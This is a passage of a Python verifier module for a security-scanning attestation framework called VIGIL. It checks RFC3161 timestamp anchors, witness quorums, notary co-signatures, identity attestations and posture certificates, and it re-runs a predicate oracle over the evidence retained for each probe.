                dt = datetime.datetime.strptime(value, "%b %d %H:%M:%S %Y %Z")
            except ValueError:
                return None
            return int(dt.replace(tzinfo=datetime.timezone.utc).timestamp())
    return None


def verify_external_time_anchor(checkpoint: dict, token_b64: str, *,
                                tsa_cert_pin: str) -> tuple[bool, Optional[int]]:
    """VIGIL-FREE offline check of the A1 RFC3161 external time anchor. Re-hash the checkpoint to
    ``checkpoint_hash``, then ``openssl ts -verify`` the base64 token over that hash against the PINNED TSA
    cert, and extract genTime — the "existed no-later-than T" bound. A TAMPERED checkpoint hashes
    differently → imprint mismatch → FAIL; a token from a WRONG/unpinned TSA → chain failure → FAIL. Uses
    only the system openssl binary via subprocess (no VIGIL import, no hand-parsed ASN.1). Fail-closed."""
    if not tsa_cert_pin or not Path(tsa_cert_pin).exists():
        return False, None
    if not openssl_ts_available():
        return False, None
    try:
        token = base64.b64decode(str(token_b64), validate=True)
    except (binascii.Error, ValueError):
        return False, None
    digest_hex = checkpoint_hash(checkpoint)
    with tempfile.TemporaryDirectory() as td:
        tok = Path(td) / "token.tsr"
        tok.write_bytes(token)
        r = subprocess.run(["openssl", "ts", "-verify", "-digest", digest_hex, "-sha256", "-in", str(tok),
                            "-CAfile", tsa_cert_pin], capture_output=True, text=True)
        if r.returncode != 0 or "Verification: OK" not in (r.stdout + r.stderr):
            return False, None
        gen = _anchor_gentime_epoch(tok)
        if gen is None:
            return False, None
        return True, gen


def verify_timed_witnessed(checkpoint: dict, timed_sigs: list, *, witness_trust_root: dict,
                           min_distinct_signers: Optional[int] = None,
                           external_time_anchor: Optional[str] = None,
                           tsa_cert_pin: Optional[str] = None) -> tuple[bool, Optional[int], str]:
    """Verify a strict-majority witness quorum TIMED-co-signed ``checkpoint`` and return its no-later-than
    bound (mirrors ``attestation_witness.verify_timed_witnessed``). Returns (ok, T, reason), FAIL-CLOSED:

      1. quorum SHAPE — refuse unless :func:`is_split_view_resistant` holds;
      2. verify + de-duplicate — per sig resolve the authoriser by key_id and verify over the timed bytes
         (each commits to its OWN observed_time); collect DISTINCT verifying witnesses by decoded key. An
         unknown key_id / weak-or-malformed key / non-verifying-or-malformed signature is IGNORED (never
         counted, never raised);
      3. quorum COUNT — distinct verifying witnesses >= max(threshold, min_distinct_signers);
      4. no-later-than median T — the (n//2)-th of the sorted distinct-verifying observed times (exact
         median for odd n; upper-median for even n — deterministic integer);
      5. external anchor (A1) — if ``external_time_anchor`` (base64 RFC3161 token) AND ``tsa_cert_pin`` are
         supplied, verify the token over ``checkpoint_hash`` against the pinned cert (VIGIL-free openssl):
         on success its genTime SUPERSEDES the median (witness-honesty-independent); a present-but-bad anchor
         FAILS CLOSED. With no anchor supplied the median stands (unchanged behaviour).

    HONEST LIMIT (does NOT overclaim, per WITNESS-TRUST §4): the median T bounds when the head was WITNESSED,
    not when the oracle re-fired; independence of the distinct keyholders is a deployment assumption
    uncheckable by code; a fully-dishonest PRODUCER curates which sigs are presented (raise
    min_distinct_signers toward n, or use the external anchor, for a hard guarantee) — and a *local*
    self-signed TSA proves the anchor MECHANISM only, not third-party independence (the A1 residual)."""
    if not is_split_view_resistant(witness_trust_root):
        return False, None, "not split-view resistant: sub-majority / duplicate / weak witness key"

    by_id = {a.get("key_id"): a for a in witness_trust_root.get("authorizers", []) if isinstance(a, dict)}
    distinct_verified: dict = {}  # decoded 32-byte key -> observed_time
    for ts in timed_sigs:
        if not isinstance(ts, dict):
            continue
        auth = by_id.get(ts.get("key_id"))
        if auth is None:
            continue
        try:
            decoded = _b64_exact(str(auth.get("public_key_b64", "")), 32, "witness key")
            _reject_weak_public_key(decoded)
        except (WeakKey, ValueError, binascii.Error):
            continue
        if decoded in distinct_verified:
            continue
        try:
            observed = int(ts.get("observed_time"))
        except (TypeError, ValueError):
            continue
        if verify_one(str(auth.get("public_key_b64", "")), _timed_signing_bytes(checkpoint, observed),
                      str(ts.get("signature_b64"))):
            distinct_verified[decoded] = observed

    required = int(witness_trust_root.get("threshold", 0))
    if min_distinct_signers is not None:
        required = max(required, int(min_distinct_signers))
    if len(distinct_verified) < required:
        return (False, None,
                f"quorum not met (need {required} distinct verifying witnesses, got {len(distinct_verified)})")

    observed_times = sorted(distinct_verified.values())
    median_T = observed_times[len(observed_times) // 2]

    # 5. external RFC3161 anchor (A1) — SUPERSEDES the median when present + verifiable against the pin. A
    #    present-but-unverifiable anchor FAILS CLOSED (a tampered checkpoint / wrong TSA cert must not fall
    #    back silently to the weaker median). The token is a SIDECAR; genTime is read from the SIGNED token.
    if external_time_anchor is not None and tsa_cert_pin is not None:
        anchor_ok, anchored_T = verify_external_time_anchor(
            checkpoint, external_time_anchor, tsa_cert_pin=tsa_cert_pin)
        if not anchor_ok or anchored_T is None:
            return (False, None,
                    "external time anchor present but did NOT verify against the pinned TSA cert over "
                    "checkpoint_hash (tampered checkpoint / wrong TSA cert / malformed token) — fail-closed")
        return (True, anchored_T,
                f"{len(distinct_verified)} distinct witness(es) co-signed; no-later-than T={anchored_T} = "
                f"RFC3161 external anchor genTime (SUPERSEDES the quorum-median {median_T}; witness-honesty-"
                f"independent — a local self-signed TSA proves the MECHANISM only, third-party independence "
                f"is the A1 residual)")

    return (True, median_T,
            f"{len(distinct_verified)} distinct witness(es) co-signed; no-later-than T={median_T} = median of "
            f"the PRESENTED signing quorum's clocks (sound only if that quorum is strict-majority honest — a "
            f"hard time guarantee needs the external anchor)")


# ---------------------------------------------------------------------------
# 7b. Z1 — channel-binding (zkTLS) notary co-sign, VIGIL-free. Mirrors
#     vigil_integration.channel_binding.verify_channel_binding_evidence byte-for-byte.
# ---------------------------------------------------------------------------
def channel_bound_signing_bytes(cbr: dict) -> bytes:
    """Domain tag + canonical channel-bound response — the exact bytes a notary signs / a verifier checks
    (byte-identical to ``channel_binding.channel_bound_signing_bytes``)."""
    return _CHANNEL_BINDING_DOMAIN + canonical_json(cbr)


def verify_channel_binding_evidence(evidence: dict, *,
                                    notary_public_key_pin_b64: str) -> tuple[bool, str]:
    """VIGIL-FREE offline check that a Z1 channel-binding envelope binds its carried response bytes to a TLS
    session under a co-signature from the PINNED notary — WITHOUT trusting the producer. Byte-identical to
    ``channel_binding.verify_channel_binding_evidence``. Checks: schema; the co-signing key equals the
    out-of-band pinned notary key; the carried ``response_b64`` bytes hash to the bound ``response_sha256``;
    the binding is a known non-empty TLS session binding; the notary Ed25519 co-signature verifies over the
    domain-separated (session-binding, response-hash) tuple. Fail-closed.

    HONEST LIMIT: passing proves the notary co-signed THIS (session, bytes) tuple and the bytes match — a
    SOFTWARE notary can be handed a fabricated tuple, so this is the verifier SHAPE + mechanism, NOT genuine
    producer-unforgeability (needs zkTLS/MPC-TLS + a third-party notary — the Z1 residual)."""
    if not isinstance(evidence, dict):
        return False, "evidence is not an object"
    if evidence.get("schema") != _CHANNEL_BINDING_SCHEMA:
        return False, f"wrong schema (expected {_CHANNEL_BINDING_SCHEMA!r})"
    if not notary_public_key_pin_b64:
        return False, "no notary public-key pin supplied (fail-closed: the pin is the only trust anchor)"

    cosign = evidence.get("notary_cosign") or {}
    sig_b64 = str(cosign.get("signature_b64", ""))
    if not sig_b64:
        return False, "no notary co-signature present (a producer-fabricated response is rejected)"
    if str(cosign.get("notary_public_key_b64", "")) != notary_public_key_pin_b64:
        return False, "co-signing key is not the pinned notary key (untrusted / producer-supplied signer)"

    cbr = evidence.get("channel_bound_response") or {}
    binding = cbr.get("binding") or {}
    response_sha256 = str(cbr.get("response_sha256", ""))

    try:
        body = base64.b64decode(str(evidence.get("response_b64", "")), validate=True)
    except (binascii.Error, ValueError):
        return False, "response_b64 is not valid base64"
    if sha256_hex(body) != response_sha256:
        return False, "carried response bytes do not hash to the bound response_sha256"

    if binding.get("kind") not in _CHANNEL_BINDING_KINDS:
        return False, f"unknown session-binding kind {binding.get('kind')!r}"
    if not str(binding.get("binding_hex", "")):
        return False, "empty session binding (response is not tied to any TLS session)"

    msg = channel_bound_signing_bytes(cbr)
    try:
        ok = verify_one(notary_public_key_pin_b64, msg, sig_b64)
    except Exception:
        return False, "malformed notary key/signature material"
    if not ok:
        return False, "notary co-signature does not verify over the (session-binding, response-hash) tuple"
    kind = binding.get("kind")
    return True, (
        f"channel-bound response verified: {kind} binding to {binding.get('host')}:{binding.get('port')}, "
        f"notary-cosigned by pinned key {cosign.get('notary_key_id')} (MECHANISM — a software notary is not "
        f"producer-unforgeable; see Z1 residual)")


# ---------------------------------------------------------------------------
# 8. Bundle verification (compose everything) + CLI
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# 8. PostureCertificate (the Certificate of Non-Exploitability) — standalone, VIGIL-free.
#    Re-checks: the m-of-n governance signature over the canonical bytes + the out-of-band AUTHORIZER
#    fingerprint pin (byte-identical to eval.benchmark_run._scorecard_fingerprint, the idiom the
#    posture/coverage/M1 certs sign under); that posture_claims re-project byte-identically from the
#    embedded coverage cert (a forged claim, detached from its evidence, is refused; a CLOSED with no
#    conclusive oracle is refused); and the owner-signed target IdentityAttestation binds the certificate
#    to the scanned target (closes target-swap).
#    TIERS: a "binding" CLOSED claim has its signed coverage verdict re-checked (not re-derived); a
#    "re-executable" CLOSED claim additionally has its verdict RE-DERIVED here (`_reexecute_posture` re-runs
#    the pure predicate oracle over the retained values), confirming the verdict↔evidence binding WITHOUT
#    trusting the producer's verdict.
#    BOUNDARY (the honest residual): the retained values are producer-supplied — re-execution does NOT prove
#    they reflect the live target. Trusting the negative reflects reality (for BOTH tiers) still needs a
#    live VIGIL re-run (a coverage re-run / `framework.v2 evidence verify`); true producer-independence of
#    the OBSERVATION needs a channel-bound live capture.
# ---------------------------------------------------------------------------
_IDENTITY_ATT_DOMAIN = b"vigil-identity-attestation-v1\x00"  # == vigil_core.spine_domains DOMAIN_TAGS["identity"]


def _authorizer_fingerprint(authorizers: list) -> str:
    """sha256 over the canonical authorizer set — byte-identical to eval.benchmark_run._scorecard_fingerprint
    (the pin the posture/coverage/benchmark certs publish out-of-band)."""
    return "sha256:" + sha256_hex(canonical_json(sorted(authorizers, key=lambda a: a.get("key_id", ""))))


def _identity_core(att: dict) -> dict:
    """Rebuild the signed core of an IdentityAttestation from its dict — byte-identical to
    vigil_core.capability.IdentityAttestation._core()."""
    return {
        "schema_version": att.get("schema_version"),
        "owner_pubkey": att.get("owner_pubkey"),
        "engagement": att.get("engagement"),
        "policy": {k: sorted(v) for k, v in sorted((att.get("policy") or {}).items())},
        "not_after": att.get("not_after"),
    }


def _policy_wellformed(policy: Any) -> bool:
    if not isinstance(policy, dict) or not policy:
        return False
    for dim, allowed in policy.items():
        if not isinstance(dim, str) or not dim.strip():
            return False
        if not isinstance(allowed, list) or not allowed:
            return False
        if any((not isinstance(v, str)) or (not v.strip()) for v in allowed):
            return False
    return True


def _verify_identity_attestation(att: dict, owner_pubkey: str, engagement: str, now: int) -> tuple[bool, str]:
    """VIGIL-free mirror of vigil_core.capability.verify_identity_attestation (fail-closed)."""
    if not isinstance(att, dict):
        return False, "identity attestation missing"
    if int(att.get("schema_version", -1)) != 1:
        return False, f"unsupported identity schema_version {att.get('schema_version')!r}"
    if not owner_pubkey or att.get("owner_pubkey") != owner_pubkey:
        return False, "identity attestation is not by the pinned owner key"
    if att.get("engagement") != engagement:
        return False, f"identity engagement {att.get('engagement')!r} != required {engagement!r}"
    if not _policy_wellformed(att.get("policy")):
        return False, "identity attestation carries a malformed policy"
    sig = att.get("sig")
    if not sig or not isinstance(sig, str):
        return False, "identity attestation is unsigned"
    if not verify_one(str(owner_pubkey), _IDENTITY_ATT_DOMAIN + canonical_json(_identity_core(att)), str(sig)):
        return False, "identity signature does not verify against the owner key"
    if int(now) > int(att.get("not_after", 0)):
        return False, f"identity attestation expired (now {int(now)} > not_after {att.get('not_after')})"
    return True, "identity OK"


def _identity_matches(policy: dict, sample: Any) -> bool:
    """VIGIL-free mirror of vigil_core.capability.identity_matches."""
    if not _policy_wellformed(policy) or not isinstance(sample, dict):
        return False
    for dim, allowed in policy.items():
        observed = sample.get(dim)
        if not isinstance(observed, str) or observed not in set(allowed):
            return False
    return True


# --- the re-executable posture tier (VIGIL-FREE): re-derive the verdict over retained values ---------
# A faithful port of verify.oracles._eval_predicate / predicate_oracle (eager eval + same exception→
# non-conclusive semantics; a parity test in integration/tests pins it to the real oracle). Pure stdlib —
# no framework, no vigil_core. It re-derives the VERDICT from the retained values, so a relying party
# confirms the verdict WITHOUT trusting the producer's asserted verdict. HONEST BOUND: the values are
# producer-supplied; this proves the verdict↔evidence binding, NOT that the evidence is live (trusting the
# negative reflects reality — for both tiers — still needs a live re-run).


def _reexec_probe_evidence(probe: dict):
    """The re-execution kernel input a coverage-cert probe row carries, or None. Must match
    posture.certificate._probe_reexec_evidence exactly (so the tier projection agrees byte-for-byte)."""
    ev = probe.get("evidence")
    if not isinstance(ev, dict):
        return None
    pred, obs = ev.get("predicate"), ev.get("observed_evidence")
    if isinstance(pred, dict) and isinstance(obs, dict):
        kernel = {"predicate": pred, "observed_evidence": obs}
        # Lane S: the provenance-ref slot is part of the oracle INPUT the structural grammar gate reads, so a
        # faithful re-execution carries it when present. Absent it the kernel is the two-key dict as before.
        # Identical to posture.certificate._probe_reexec_evidence, so the tier projection agrees byte-for-byte.
        pref = ev.get("provenance_refs")
        if isinstance(pref, dict) and pref:
            kernel["provenance_refs"] = pref
        return kernel
    return None


def _reexec_resolve_operand(operand, observed: dict):
    if isinstance(operand, dict) and set(operand.keys()) == {"var"}:
        return observed.get(operand["var"])
    return operand


def _reexec_eval_predicate(pred, observed: dict) -> bool:
    """Port of oracles._eval_predicate (the 'fired' half). EAGERLY evaluates all/any children (like the
    real oracle — no short-circuit) so a type error in any child surfaces identically. Raises on a
    malformed node / bad operand; the caller (_reexec_fired_conclusive) turns any raise into a
    NON-CONCLUSIVE result, matching predicate_oracle's except-(ValueError,TypeError)->conclusive=False."""
    if not isinstance(pred, dict) or len(pred) != 1:
        raise ValueError(f"malformed re-execution predicate node: {pred!r}")
    op, args = next(iter(pred.items()))
    if op == "all":
        return all([_reexec_eval_predicate(p, observed) for p in args])   # eager, matches the oracle
    if op == "any":
        return any([_reexec_eval_predicate(p, observed) for p in args])   # eager, matches the oracle
    if op == "not":
        return not _reexec_eval_predicate(args, observed)
    a = _reexec_resolve_operand(args[0], observed)
    b = _reexec_resolve_operand(args[1], observed) if len(args) > 1 else None
    if op == "eq":
        return a == b
    if op == "ieq":
        return str(a).lower() == str(b).lower()
    if op == "contains":
        return bool(a) and bool(b) and str(b) in str(a)
    if op == "icontains":
        return bool(a) and bool(b) and str(b).lower() in str(a).lower()
    if op == "in":
        return a in (b or [])
    if op == "min_len":
        return len(str(a or "")) >= int(b)
    if op == "gt":
        return a is not None and b is not None and a > b
    if op == "ge":
        return a is not None and b is not None and a >= b
    raise ValueError(f"unknown re-execution predicate op {op!r}")


# --- Lane S (S1, re-slice): the STRUCTURAL FACT-ELIGIBILITY GRAMMAR, ported BYTE-FAITHFULLY from -------
# verify.oracles._fact_eligible (+ its helpers) and the _predicate_binds_and_const pre-gate, so this
# ZERO-VIGIL kernel renders the IDENTICAL (fired, conclusive) verdict predicate_oracle mints over the SAME
# (predicate, observed, provenance_refs) — not merely RAW predicate truth. Without this gate a bare shape
# (eq[a,b] a==b, contains[body, LIT], in[status,[3xx]], min_len[tok,3], ge[n,5], not(eq[a,b]), the
# canary-less open_redirect all/any) re-derives True here while the grammar-gated oracle REFUSES it — so the
# moat must reject offline exactly what the oracle rejects. A predicate is FACT-eligible only when every
# firing path carries a POSITIVE DISCRIMINATOR sound by SHAPE: PD2 (var-vs-provenance-ref canary, order-
# insensitive), PD3 (strict gt[PR, int>=0] reduction floor — ge/min_len at the floor is vacuous, refused),
# PD-NUM (gt/ge over two DISTINCT captured vars), PD-VALUE (eq/gt of a captured var vs a NUMERIC/BOOL non-
# status literal), PD4 (present/absent differential pos(CV_a,needle) AND not(pos(CV_b,needle)) over DISTINCT
# captured bodies sharing one DISTINCTIVE needle). provenance_refs names the observed_evidence keys that are
# VIGIL-injected (a PR); a var NOT listed there but present+non-None in observed is a captured var (CV); any
# other inline value is a producer literal (LIT). all => ANY child eligible OR a PD4 pair; any => EVERY child
# eligible; not => never a positive fire-driver. Pure stdlib — NO framework / vigil import (zero-VIGIL moat).
_DISTINCTIVENESS_MIN_LEN = 6
_POSITIVE_MATCH_OPS = frozenset({"eq", "ieq", "contains", "icontains", "in"})
_PROTOCOL_STATUS_CONSTANTS = frozenset({100, 200, 300, 301, 302, 303, 307, 308, 400, 401, 403})
_REFLEXIVE_TRUE_OPS = frozenset({"eq", "ieq", "ge", "contains", "icontains", "in"})
_REFLEXIVE_FALSE_OPS = frozenset({"gt"})


def _is_var_operand(operand) -> bool:
    return isinstance(operand, dict) and set(operand.keys()) == {"var"}


def _operand_is_provenance_ref(operand, provenance_refs: dict) -> bool:
    return _is_var_operand(operand) and operand["var"] in (provenance_refs or {})


def _operand_is_captured_var(operand, observed: dict, provenance_refs: dict) -> bool:
    return (_is_var_operand(operand) and operand["var"] not in (provenance_refs or {})
            and observed.get(operand["var"]) is not None)


def _operand_binds_captured(operand, observed: dict) -> bool:
    if _is_var_operand(operand):
        return observed.get(operand["var"]) is not None
    return False


def _needle_sig(operand):
    if _is_var_operand(operand):
        return ("var", operand["var"])
    try:
        hash(operand)
        return ("lit", operand)
    except TypeError:
        return ("lit", repr(operand))


def _needle_is_distinctive(sig) -> bool:
    kind, val = sig
    if kind == "var":
        return True
    return isinstance(val, str) and len(val) >= _DISTINCTIVENESS_MIN_LEN


def _is_scalar_value_literal(operand) -> bool:
    if isinstance(operand, bool):
        return True
    if isinstance(operand, (int, float)) and not isinstance(operand, bool):
        return operand not in _PROTOCOL_STATUS_CONSTANTS
    return False


# Auto-check LIVENESS / AVAILABILITY flags (BYTE-FAITHFUL mirror of oracles._LIVENESS_AVAILABILITY_KEYS). A
# captured var of one of these names compared to a scalar literal (eq[body_available,True], gt[probe_count,0],
# eq[reachable,True]) is true for any merely-reachable target and adjudicates NOTHING about a vuln — a
# CORROBORATOR, never a self-sufficient PD-VALUE. It is structurally indistinguishable from a genuine
# achieved-state scalar (bizlogic eq[qty,-5] / eq[checked_out,True] / gt[redeemed_count,1]; gt[qty,0] has the
# SAME shape as gt[probe_count,0]), and the owner-signed-spec authority that would separate them is not
# reachable inside the pure predicate oracle, so this NAMED set is the structural stand-in (mirrors
# _PROTOCOL_STATUS_CONSTANTS). A leaf over one of these keys is FACT-eligible only when the enclosing predicate
# ALSO carries a real PD (PR canary/reduction or a PD4 differential). Matched case-insensitively.
_LIVENESS_AVAILABILITY_KEYS = frozenset({
    "body_available", "body_semantically_available",
    "reachable", "available", "responsive", "responded",
    "alive", "is_alive", "is_live",
    "host_up", "online", "port_open",
    "probe_count", "probes", "response_count", "reply_count",
})


def _operand_is_liveness_flag(operand, observed: dict, provenance_refs: dict) -> bool:
    """A captured var whose KEY is a known auto-check liveness/availability flag — a gate corroborator, NEVER
    a self-sufficient PD-VALUE."""
    return (_operand_is_captured_var(operand, observed, provenance_refs)
            and str(operand["var"]).lower() in _LIVENESS_AVAILABILITY_KEYS)


def _leaf_is_self_sufficient_pd(op, args, observed: dict, provenance_refs: dict) -> bool:
    if not isinstance(args, (list, tuple)) or len(args) != 2:
        return False
    a, b = args[0], args[1]
    if op in _POSITIVE_MATCH_OPS:
        if (_operand_is_provenance_ref(a, provenance_refs)
                and _operand_is_captured_var(b, observed, provenance_refs)):
            return True
        if (_operand_is_provenance_ref(b, provenance_refs)
                and _operand_is_captured_var(a, observed, provenance_refs)):
            return True
        if op in ("eq", "ieq"):
            if (_operand_is_captured_var(a, observed, provenance_refs)
                    and not _operand_is_liveness_flag(a, observed, provenance_refs)
                    and _is_scalar_value_literal(b)):
                return True
            if (_operand_is_captured_var(b, observed, provenance_refs)
                    and not _operand_is_liveness_flag(b, observed, provenance_refs)
                    and _is_scalar_value_literal(a)):
                return True
        return False
    if op == "gt" and _operand_is_provenance_ref(a, provenance_refs) and isinstance(b, int) \
            and not isinstance(b, bool) and b >= 0:
        return True
    if op in ("gt", "ge") and _operand_is_captured_var(a, observed, provenance_refs) \
            and _operand_is_captured_var(b, observed, provenance_refs) and a != b:
        return True
    if op == "gt":
        if (_operand_is_captured_var(a, observed, provenance_refs)
                and not _operand_is_liveness_flag(a, observed, provenance_refs)
                and _is_scalar_value_literal(b)):
            return True
        if (_operand_is_captured_var(b, observed, provenance_refs)
                and not _operand_is_liveness_flag(b, observed, provenance_refs)
                and _is_scalar_value_literal(a)):
            return True
    return False


def _collect_match_relations(pred, observed: dict, provenance_refs: dict, negated: bool,
                             pos: set, neg: set) -> None:
    if not isinstance(pred, dict) or len(pred) != 1:
        return
    op, args = next(iter(pred.items()))
    if op in ("all", "any"):
        if isinstance(args, (list, tuple)):
            for c in args:
                _collect_match_relations(c, observed, provenance_refs, negated, pos, neg)
        return
    if op == "not":
        _collect_match_relations(args, observed, provenance_refs, not negated, pos, neg)
        return
    if op in _POSITIVE_MATCH_OPS and isinstance(args, (list, tuple)) and len(args) == 2:
        body, needle = args[0], args[1]
        if _operand_is_captured_var(body, observed, provenance_refs):
            (neg if negated else pos).add((body["var"], _needle_sig(needle)))


def _pd4_present(pred, observed: dict, provenance_refs: dict) -> bool:
    pos: set = set()
    neg: set = set()
    _collect_match_relations(pred, observed, provenance_refs, False, pos, neg)
    for a_key, a_needle in pos:
        if not _needle_is_distinctive(a_needle):
            continue
        for b_key, b_needle in neg:
            if b_needle == a_needle and b_key != a_key:
                return True
    return False


def _fact_eligible(pred, observed: dict, provenance_refs: dict) -> bool:
    """Decidable FACT-eligibility over the frozen predicate AST — BYTE-IDENTICAL to oracles._fact_eligible:
    leaf => a self-sufficient PD; all => ANY child eligible OR a PD4 pair; any => EVERY disjunct eligible;
    not => False."""
    if not isinstance(pred, dict) or len(pred) != 1:
        return False
    op, args = next(iter(pred.items()))
    if op == "all":
        if not isinstance(args, (list, tuple)) or not args:
            return False
        if any(_fact_eligible(c, observed, provenance_refs) for c in args):
            return True
        return _pd4_present(pred, observed, provenance_refs)
    if op == "any":
        if not isinstance(args, (list, tuple)) or not args:
            return False
        return all(_fact_eligible(c, observed, provenance_refs) for c in args)
    if op == "not":
        return False
    return _leaf_is_self_sufficient_pd(op, args, observed, provenance_refs)


def _predicate_binds_and_const(pred, observed: dict):
    """(binds_captured, constant_true, constant_false) over the AST — BYTE-IDENTICAL to
    oracles._predicate_binds_and_const. Raises ValueError on a malformed node (the caller funnels that into
    the non-conclusive malformed branch, as predicate_oracle does)."""
    if not isinstance(pred, dict) or len(pred) != 1:
        raise ValueError(f"predicate node must be a single-op mapping, got {pred!r}")
    op, args = next(iter(pred.items()))
    if op in ("all", "any"):
        if not isinstance(args, (list, tuple)) or not args:
            raise ValueError(f"{op!r} requires a non-empty list of sub-predicates")
        binds = False
        child_true = []
        child_false = []
        for p in args:
            b, ct, cf = _predicate_binds_and_const(p, observed)
            binds = binds or b
            child_true.append(ct)
            child_false.append(cf)
        if op == "all":
            return binds, all(child_true), any(child_false)
        return binds, any(child_true), all(child_false)
    if op == "not":
        b, ct, cf = _predicate_binds_and_const(args, observed)
        return b, cf, ct
    if op not in ("eq", "ieq", "contains", "icontains", "in", "min_len", "gt", "ge"):
        raise ValueError(f"unknown predicate op {op!r}")
    if not isinstance(args, (list, tuple)) or not args:
        raise ValueError(f"{op!r} requires operand(s)")
    has_second = len(args) > 1
    left, right = args[0], (args[1] if has_second else None)
    identical = has_second and left == right
    const_true = identical and op in _REFLEXIVE_TRUE_OPS
    const_false = identical and op in _REFLEXIVE_FALSE_OPS
    binds = _operand_binds_captured(left, observed) or (has_second and _operand_binds_captured(right, observed))
    return binds, const_true, const_false


def _reexec_fired_conclusive(pred, observed: dict, provenance_refs: dict | None = None):
    """Re-run the predicate → (fired, conclusive), mirroring predicate_oracle's decision sequence EXACTLY so
    the verdict is byte-identical over the SAME (predicate, observed, provenance_refs):

      1. a malformed predicate (the binds/const walk raises) is NON-conclusive (the oracle's malformed branch);
      2. a predicate NOT FACT-eligible under the structural grammar is REFUSED — non-firing, NON-conclusive
         (the S1 soundness gate: no positive discriminator adjudicates nothing SOUND);
      3. a constant-true tautology, or a predicate binding no captured value, is REFUSED (non-conclusive);
      4. otherwise the predicate is evaluated — a well-formed evaluation is conclusive; ANY evaluation error
         is (False, False), non-conclusive, never a silent pass.

    Fail-closed by construction."""
    prefs = dict(provenance_refs or {})
    try:
        binds_captured, constant_true, _constant_false = _predicate_binds_and_const(pred, observed)
    except Exception:  # a malformed predicate is NON-CONCLUSIVE (predicate_oracle's malformed branch)
        return False, False
    if not _fact_eligible(pred, observed, prefs):
        return False, False
    if constant_true or not binds_captured:
        return False, False
    try:
        return bool(_reexec_eval_predicate(pred, observed)), True
    except Exception:  # a malformed/ill-typed kernel is NON-CONCLUSIVE, never fired-clean
        return False, False


def _reexecute_posture(coverage_cert: dict) -> tuple[bool, str]:
    """Re-derive the verdict of every re-executable probe from its retained values; refuse a forged
    negative (a 'clean' probe whose predicate fires OR is non-conclusive over its own values) or a forged
    positive (a 'finding' probe that does not conclusively fire). This confirms the verdict↔evidence
    binding without trusting the producer's verdict; it does NOT prove the values are live (see header)."""
    n = 0
    for probe in coverage_cert.get("probes") or []:
        if not isinstance(probe, dict):
            continue
        kernel = _reexec_probe_evidence(probe)
        if kernel is None:
            continue
        fired, conclusive = _reexec_fired_conclusive(kernel["predicate"], dict(kernel["observed_evidence"]),
                                                     kernel.get("provenance_refs"))
        n += 1
        verdict = probe.get("verdict")
        if verdict == "clean" and (fired or not conclusive):
            return False, (f"re-execution REFUTED a CLOSED claim: retained values do not support a "
                           f"conclusive non-firing verdict (fired={fired}, conclusive={conclusive}; "
                           f"surface={probe.get('surface')!r} class={probe.get('class')!r})")
        if verdict == "finding" and not (fired and conclusive):
            return False, (f"re-execution REFUTED an OPEN claim: predicate does not conclusively fire over "
                           f"the probe's own retained values (surface={probe.get('surface')!r} class={probe.get('class')!r})")
    return True, f"re-derived {n} probe verdict(s) from retained evidence"


def _project_posture_claims(coverage_cert: dict) -> list:
    """VIGIL-free mirror of posture.certificate.project_posture_claims (fail-closed on a false-CLOSED
    source: a 'clean' probe with no conclusive oracle). The ``verification`` tier is computed here
    IDENTICALLY to the in-tree projection, so posture_claims re-project byte-for-byte."""
    probes = coverage_cert.get("probes")
    if not isinstance(probes, list):
        raise ValueError("coverage certificate has no probes list")
    groups: dict = {}
    for p in probes:
        if not isinstance(p, dict):
            raise ValueError("malformed probe row")
        verdict = p.get("verdict")
        kinds = p.get("oracle_kinds_run") or []
        if not isinstance(kinds, (list, tuple)):
            raise ValueError("oracle_kinds_run is not a list — invalid coverage certificate")
        if verdict == "clean" and not kinds:
            raise ValueError("a 'clean' probe carries no oracle_kinds_run — invalid coverage certificate")
        key = (str(p.get("surface", "")), str(p.get("param", "")), str(p.get("class", "")))
        g = groups.setdefault(
            key, {"finding": 0, "clean": 0, "inconclusive": 0, "kinds": set(), "n": 0, "clean_reexec": 0})
        g["n"] += 1
        if verdict in ("finding", "clean", "inconclusive"):
            g[verdict] += 1
        if verdict == "clean":
            g["kinds"].update(str(k) for k in kinds)
            if _reexec_probe_evidence(p) is not None:
                g["clean_reexec"] += 1
    claims = []
    for (surface, param, cls), g in groups.items():
        if g["finding"] > 0:
            status, kinds = "OPEN", []
        elif g["clean"] > 0:
            status, kinds = "CLOSED", sorted(g["kinds"])
        else:
            status, kinds = "UNPROVEN", []
        if status == "CLOSED" and g["clean"] > 0 and g["clean_reexec"] == g["clean"]:
            verification = "re-executable"
        else:
            verification = "binding"
        claims.append({"surface": surface, "param": param, "class": cls, "status": status,
                       "verification": verification, "evidence_oracle_kinds": kinds, "n_probes": g["n"]})
    claims.sort(key=lambda c: (c["surface"], c["param"], c["class"]))
    return claims


# S9c: VIGIL-free mirror of posture.certificate._normalize_incomplete / posture_overall_verdict — so a
# third party enforces the SAME coverage-incomplete downgrade the in-tree verifier does. A certificate that
# declares an UNASSESSED surface (``coverage_incomplete``) must carry the downgraded overall verdict and can
# never read as a clean whole-target CLOSED. Additive: absent the disclosure block this is a no-op, so an
# existing (web-only) bundle verifies byte-for-byte as before.
def _pp_normalize_incomplete(coverage_incomplete: Any) -> list:
    seen = set()
    for item in coverage_incomplete or ():
        try:
            if isinstance(item, dict):
                sensor = str(item.get("sensor") or "").strip()
                missing = str(item.get("missing_prerequisite") or "").strip()
            else:
                sensor, missing = item
                sensor, missing = str(sensor or "").strip(), str(missing or "").strip()
        except Exception:
            continue
        if sensor:
            seen.add((sensor, missing))
    return [{"sensor": s, "missing_prerequisite": m} for (s, m) in sorted(seen)]


def _pp_overall_verdict(claims: list, unassessed: list) -> str:
    if any(c.get("status") == "OPEN" for c in claims):
        return "OPEN"
    if unassessed:
        return "COVERAGE_INCOMPLETE"
    n_closed = sum(1 for c in claims if c.get("status") == "CLOSED")
    n_unproven = sum(1 for c in claims if c.get("status") == "UNPROVEN")
    if n_closed and not n_unproven:
        return "CLOSED"
    if n_closed:
        return "PARTIAL"
    return "UNPROVEN"


def verify_posture(posture: dict, *, pin: str, owner_pubkey: str, engagement: str, now: int) -> tuple[bool, str]:
    """Standalone-verify a PostureCertificate. ``posture`` = {"certificate": {...}, "signature": {...}}.
    Fail-closed: authenticity + pin, then coverage-projection binding, then owner target-binding."""
    cert = posture.get("certificate") or {}
    sig_env = posture.get("signature") or {}
    tr = sig_env.get("trust_root") or {}
    authz = tr.get("authorizers") or []
    # 1. out-of-band pin over the authorizer set (REQUIRED — fail-closed, the H4 lesson)
    fp = _authorizer_fingerprint(authz)
    pin_s = (pin or "").strip()
    if not pin_s:
